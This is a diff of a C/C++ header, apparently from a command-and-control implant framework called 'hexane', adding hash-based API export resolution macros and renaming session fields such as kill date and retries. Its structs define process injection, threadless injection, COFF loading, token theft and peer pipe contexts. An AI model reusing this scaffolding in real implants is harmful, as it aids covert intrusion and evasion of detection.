@@ -71,9 +71,9 @@ LPVOID
 #define PIPE_BUFFER_MAX					(64 * 1000 - 1)
 
 #define Malloc(s)						Ctx->nt.RtlAllocateHeap(Ctx->heap, HEAP_ZERO_MEMORY, s)
-#define Realloc(p, s) 	    		Ctx->nt.RtlReAllocateHeap(Ctx->heap, HEAP_ZERO_MEMORY, p, s)
+#define Realloc(p, s) 	    			Ctx->nt.RtlReAllocateHeap(Ctx->heap, HEAP_ZERO_MEMORY, p, s)
 #define Free(s) 			    		Ctx->nt.RtlFreeHeap(Ctx->heap, 0, s)
-#define Zerofree(x, n) 		        if (x) { x_memset(x, 0, n); x_free(x); x = nullptr; }
+#define Zerofree(x, n) 					if (x) { x_memset(x, 0, n); x_free(x); x = nullptr; }
 
 #define x_assert(x)     				if (!(x)) goto defer
 #define x_assertb(x) 					if (!(x)) { success = false; goto defer; }
@@ -81,6 +81,10 @@ LPVOID
 #define x_ntassertb(x)   				ntstatus = x; if (!NT_SUCCESS(ntstatus)) { success = false; goto defer; }
 #define return_defer(x)					ntstatus = x; goto defer
 
+#define F_PTR_HMOD(F, M, SH)			(F = (decltype(F)) Memory::Modules::GetExportAddress(M, SH))
+#define F_PTR_HASHES(F, MH, SH)			(F = (decltype(F)) Memory::Modules::GetExportAddress((Memory::Modules::GetModuleEntry(MH)->DllBase), SH))
+#define C_PTR_HASHES(F, MH, SH)			(F = (void*) Memory::Modules::GetExportAddress((Memory::Modules::GetModuleEntry(MH)->DllBase), SH))
+#define M_PTR(MH)						((Memory::Modules::GetModuleEntry(MH))->DllBase)
 
 #if	defined(__GNUC__) || defined(__GNUG__)
 #define __builtin_bswap32 __bswapd
@@ -283,6 +287,7 @@ typedef struct _code {
     uint32_t length;
 } CODE, *PCODE;
 
+
 typedef struct _threadless {
     PCHAR parent;
     PCHAR module;
@@ -291,6 +296,7 @@ typedef struct _threadless {
     PCODE opcode;
 }THREADLESS, *PTHREADLESS;
 
+
 typedef struct _veh_writer {
     LPVOID	target;
     PWCHAR	mod_name;
@@ -298,10 +304,12 @@ typedef struct _veh_writer {
     PCHAR	mask;
 }VEH_WRITER, *PVEH_WRITER;
 
+
 typedef struct _object_map {
 	PBYTE 	address;
 	SIZE_T 	size;
 }OBJECT_MAP, *POBJECT_MAP;
+
 
 typedef struct _coff_symbol {
 	union {
@@ -316,6 +324,7 @@ typedef struct _coff_symbol {
 	UINT8  NumberOfAuxSymbols;
 }COFF_SYMBOL, *PCOFF_SYMBOL;
 
+
 typedef struct _coff_params {
 	PCHAR   entrypoint;
 	DWORD   entrypoint_length;
@@ -327,11 +336,13 @@ typedef struct _coff_params {
     BOOL    b_cache;
 }COFF_PARAMS, *PCOFF_PARAMS;
 
+
 typedef struct _reloc {
 	UINT32 VirtualAddress;
 	UINT32 SymbolTableIndex;
 	UINT16 Type;
 } RELOC, *PRELOC;
+
 
 typedef struct _inject_context {
 	HANDLE  process;
@@ -346,6 +357,7 @@ typedef struct _inject_context {
 	UINT32  parameter_size;
 	SHORT   technique;
 } INJECT_CONTEXT, *PINJECT_CONTEXT;
+
 
 typedef struct _executable {
 	PBYTE					buffer;
@@ -373,11 +385,13 @@ typedef struct _executable {
 
 } EXECUTABLE, *PEXECUTABLE;
 
+
 typedef struct _request_context {
     HINTERNET conn_handle;
     HINTERNET req_handle;
     LPWSTR endpoint;
 }REQUEST_CONTEXT, *PREQUEST_CONTEXT;
+
 
 typedef struct _proxy_context {
     WINHTTP_CURRENT_USER_IE_PROXY_CONFIG    proxy_config;
@@ -385,25 +399,30 @@ typedef struct _proxy_context {
     WINHTTP_PROXY_INFO                      proxy_info;
 }PROXY_CONTEXT, *PPROXY_CONTEXT;
 
+
 typedef struct _hash_map {
 	DWORD	name;
 	LPVOID	address;
 }HASH_MAP, *PHASH_MAP;
+
 
 typedef struct _buffer {
 	PVOID  buffer;
 	UINT32 length;
 } BUFFER, *PBUFFER;
 
+
 typedef struct _mbs_buffer {
 	LPSTR 	buffer;
 	ULONG 	length;
 }MBS_BUFFER, *PMBS_BUFFER;
 
+
 typedef struct _wcs_buffer {
 	LPWSTR 	buffer;
 	ULONG 	length;
 }WCS_BUFFER, *PWCS_BUFFER;
+
 
 typedef struct _resource {
     LPVOID  res_lock;
@@ -411,11 +430,13 @@ typedef struct _resource {
     SIZE_T  size;
 }RESOURCE, *PRESOURCE;
 
+
 typedef struct _proxy {
 	LPWSTR	address;
 	LPWSTR	username;
 	LPWSTR	password;
 }PROXY, *PPROXY;
+
 
 typedef struct _http_context {
 	HINTERNET 	handle;
@@ -432,6 +453,7 @@ typedef struct _http_context {
 	PROXY		*proxy;
 }HTTP_CONTEXT, *PHTTP_CONTEXT;
 
+
 typedef struct _token_data {
 	HANDLE  handle;
 	LPWSTR  domain_user;
@@ -445,12 +467,14 @@ typedef struct _token_data {
 	_token_data* Next;
 }TOKEN_DATA, *PTOKEN_DATA;
 
+
 typedef struct _parser {
 	LPVOID 	handle;
     LPVOID  buffer;
 	ULONG 	Length;
 	BOOL 	bswap;
 } PARSER, *PPARSER;
+
 
 typedef struct _smb_pipe_sec_attr{
 	PSID	sid;
@@ -463,6 +487,7 @@ typedef struct _smb_pipe_sec_attr{
 typedef void (*COMMAND)(PARSER *args);
 typedef void (*OBJ_ENTRY)(char* args, uint32_t size);
 
+
 struct LdrpVectorHandlerEntry {
     LdrpVectorHandlerEntry 		*flink;
     LdrpVectorHandlerEntry 		*blink;
@@ -471,11 +496,13 @@ struct LdrpVectorHandlerEntry {
     PVECTORED_EXCEPTION_HANDLER handler;
 };
 
+
 struct LdrpVectorHandlerList {
     LdrpVectorHandlerEntry *first;
     LdrpVectorHandlerEntry *last;
     SRWLOCK 				lock;
 };
+
 
 typedef struct _peer_data {
 	DWORD 		peer_id;
@@ -484,19 +511,23 @@ typedef struct _peer_data {
 	_peer_data	*next;
 }PEER_DATA, *PPEER_DATA;
 
+
 typedef struct _heap_info {
     ULONG_PTR heap_id;
     DWORD pid;
 }HEAP_INFO, *PHEAP_INFO;
+
 
 typedef struct _u32_block {
     UINT32 v0;
     UINT32 v1;
 }U32_BLOCK, *PU32_BLOCK;
 
+
 typedef struct _ciphertext {
     DWORD table[64];
 }CIPHERTEXT, *PCIPHERTEXT;
+
 
 typedef struct _stream {
 	BYTE 		inbound;
@@ -508,6 +539,7 @@ typedef struct _stream {
 	BOOL 		ready;
 	_stream  	*next;
 } STREAM, *PSTREAM;
+
 
 struct _hexane{
 
@@ -535,7 +567,8 @@ struct _hexane{
 
 	struct {
 		PBYTE	session_key;
-		ULONG64	killdate;
+		UINT32	working_hours;
+		UINT64	kill_date;
 		LPSTR	hostname;
 		ULONG	sleeptime;
 		ULONG	jitter;
@@ -550,7 +583,7 @@ struct _hexane{
 		ULONG	current_taskid;
         ULONG	peer_id;
 		WORD	arch;
-		INT		retry;
+		INT		retries;
 		BOOL	checkin;
 	} session;
 
